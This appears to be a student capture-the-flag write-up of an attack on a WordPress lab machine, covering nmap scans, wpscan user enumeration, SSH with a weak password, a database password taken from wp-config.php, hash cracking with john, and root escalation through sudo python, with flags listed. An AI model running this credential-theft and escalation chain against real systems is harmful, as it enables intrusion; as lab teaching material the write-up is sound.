# Red Team: Summary of Operations

## Table of Contents

-  Exposed Services
-  Critical Vulnerabilities
-  Exploitation

### Network Scan To Identify All Available Networks:

-  nmap -sS -PO 192.168.1.*

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/nmap%20-sS%20-PO%20192.168.1.*.png">


### Target Identified
   
   -  Name:  **Target 1**
   -  IP Address: 192.168.1.110

#### Target Machine Scan

-  Nmap scan results for each machine reveal the below services and OS details:
    -  nmap -sV 192.168.110

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/nmap%20-sV%20192.168.1.110.png">

-  The scan above identifies the services below as potential points of entry:

    -  Port 22/TCP Open SSH
    -  Port 80/TCP Open HTTP
    -  Port 111/TCP Open rcpbind
    -  Port 139/TCP Open netbios-ssn
    -  Port 445/TCP Open netbios-ssn

## Critical Vulnerabilities

-  The following vulnerabilities were identified on the target Machine:
    -  1.  Wordpress user enumeration;
    -  2.  Weak user password
    -  3.  Able to obtain password for MySQL DB and start a session
    -  4.  Unsalted password hashes able to penetrate target machine and escalate user privilege to root

## Exploitatoin of Vulnerabilities

### Wordpress user enumeration: 
   - **Command Used** WordPress User Enumeration Scan:  wpscan --url http://192.168.1.110/wordpress --enumerate u

  -  **Vulnerability** CVE-2017-5487:  Scan enumerates user names and other possibly vulnerable paths and files.

  -  **Rating** Base Score: 5.3 Medium

As can be seen below the scan was successful in enumerating valid usernames of **Steven & Michael**

(Click On Image/s To Open In Expanded View)

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/wpscan%20enumeration%201.png" width="400" height="400"> <img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/wpscan%20enumeration_2.png" width="400" height="400">

### Weak user password:
  -  Weak user passwords made it possible  ssh into user shell with **Username - Michael** (Image Below).
     -  ssh michael@192.168.1.110
        -  PW = michael
  -  After login as Michael was able to traverse through directories and files where and found **Flag One & Flag Two** (Image/s Below):
     - Flag One = b9bbcb33ellb80be759c4e844862482d  
       -  /var/www/html/service.html
       -  nano service.html
     - Flag Two = fc3fd58dcdad9ab23faca6e9a3e581c
       -  /var/www/
       -  ls
       -  cat flag2.txt
  -  Able to find password to MySQL DB in the following direcotry and file (Image Below):
     -  /var/www/html/wp-config.php
     -  nano wp-config.php
     -  MySQL DB PW: R@v3nSecurity

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag-1.png">

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/MySQL_PW.png"> 

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag%202.png">
     
     
### Login To MySQL Database
  -  **Command/s Used** (See Images Below)
     -  mysql --user=root --password=R@v3nSecurity
     -  show database;
     -  use wordpress;
     -  show tables;
     -  select * from wp_users;
     -  select * from wp_posts;
        - **Flag3 Found** = afc01ab56b50591e7dccf93122770cd2
  -  Using the commands above was able to find and dump password hash for **Steven**
     -  created file on Kali Attack Machine for password hashes
        -  Command used: touch wp_hashes.txt
        -  nano wp_hashes.txt and added hashes
     -  using john the ripper obtained **Steven** password
        -  Command: john wp_hashes.txt
        -  PW = *pink84*

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/mysql%20show%20database.png"> 

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/use%20wordpress.png"> 

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag%203.png">

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/select%20*%20from%20wp_users.png">


### Able to establish user shell on target machine
  -  Logged in using **Steven** credentials
     -  ssh steven@192.168.1.110
     -  pw *pink84*
     -  escalated to root using: sudo -l
  -  Using python was able to penetrate target machine
     -  sudo python -c 'import pty;pty.spawn("/bin/bash")'
  -  Traversed the direcotry and found Flag 4
     -  **Flag4** 715dea6c055b9fe3337544932f2941ce
     -  cat flag4.txt

<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/Escate%20to%20root%20using%20python.png">



